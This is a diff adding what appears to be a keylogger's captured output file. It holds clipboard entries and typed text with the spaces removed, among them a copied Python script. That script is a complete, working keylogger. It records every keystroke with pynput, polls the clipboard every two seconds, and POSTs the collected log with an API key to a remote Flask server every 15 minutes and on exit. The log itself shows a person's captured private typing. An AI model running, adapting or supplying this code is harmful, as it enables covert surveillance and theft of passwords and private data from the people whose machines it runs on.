@@ -1,0 +1,142 @@
+
+[📋 CLIPBOARD] files = sorted(folder.glob("*.txt"))  # Oldest to newest (3:15 PM, then 3:30 PM, etc.)
+
+thebacklogcontentisstoringlikethis
+[📋 CLIPBOARD] Soyeahnoprolblembutwillitbepossibletoarrangethealereadysentlogfileinthatorder
+Ionlyneedtoarrangethefilefromoldesttonewestandthenewestfileshoulscomeaftertheolderfilewheneverthelogfileissenttotheserver
+
+
+nospacingblwthewors
+yes
+[📋 CLIPBOARD] from pynput import keyboard
+import pyperclip
+from datetime import datetime
+import requests
+import threading
+import time
+import atexit
+import signal
+import sys
+
+# ========== CONFIG ==========
+API_KEY = "secret123"
+SERVER_URL = "http://10.2.10.254:5000/upload"  # Replace with your Flask server IP
+log_buffer = ""
+
+# ========== LOGGING ==========
+last_log_time = time.time()
+log_char_count = 0  # To insert line breaks for readability
+
+
+def write_log(data):
+    global log_buffer, last_log_time, log_char_count
+    current_time = time.time()
+
+    # Insert a newline if 30 seconds have passed since the last keystroke
+    if current_time - last_log_time > 30:
+        log_buffer += "\n"
+        log_char_count = 0
+
+    last_log_time = current_time
+
+    if data:
+        log_buffer += str(data)
+        log_char_count += len(data)
+
+        # Optional: Insert line breaks every 100 characters
+        if log_char_count >= 100:
+            log_buffer += "\n"
+            log_char_count = 0
+
+
+# ========== SEND TO SERVER ==========
+def send_log_to_server():
+    global log_buffer
+    try:
+        if log_buffer.strip():
+            print("\n[🚀 Sending log to server...]")
+            response = requests.post(
+                SERVER_URL,
+                json={"api_key": API_KEY, "log": log_buffer}
+            )
+            print(f"[✔️ LOG SENT] Status Code: {response.status_code}")
+            log_buffer = ""  # Clear after sending
+    except Exception as e:
+        print(f"[❌ ERROR SENDING LOG]: {e}")
+
+
+# ========== CLIPBOARD ==========    
+def monitor_clipboard():
+    last_text = ""
+    while True:
+        try:
+            text = pyperclip.paste()
+            if text and text != last_text:
+                last_text = text
+                write_log(f"\n[📋 CLIPBOARD] {text}\n")
+        except:
+            pass
+        time.sleep(2)
+
+
+# ========== KEY LOGGER ==========
+def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            write_log(key.char)
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab: " [TAB] ",
+            keyboard.Key.backspace: " [BACKSPACE] ",
+            keyboard.Key.shift: "",
+            keyboard.Key.ctrl: "",
+            keyboard.Key.cmd: " [WINDOWS] ",
+            keyboard.Key.esc: " [ESC] ",
+        }
+        if key in special_keys:
+            write_log(special_keys[key])
+        else:
+            write_log(f"[{key}]")
+
+
+# ========== EXIT HANDLER ==========
+def handle_exit_signal(sig, frame):
+    print("\n[🛑 Stopping Keylogger...]")
+    send_log_to_server()
+    sys.exit(0)
+
+
+# Register signal and atexit handlers
+signal.signal(signal.SIGINT, handle_exit_signal)
+signal.signal(signal.SIGTERM, handle_exit_signal)
+atexit.register(send_log_to_server)
+
+# ========== PERIODIC SENDER ==========
+def periodic_sender():
+    while True:
+        time.sleep(900)  # Every 15 minutes
+        send_log_to_server()
+
+
+# ========== MAIN ==========
+if __name__ == "__main__":
+    print("[✅ Keylogger started. Press Ctrl+C to stop]")
+
+    # Start clipboard monitor
+    threading.Thread(target=monitor_clipboard, daemon=True).start()
+
+    # Start log sender
+    threading.Thread(target=periodic_sender, daemon=True).start()
+
+    # Start key listener
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        handle_exit_signal(None, None)
+
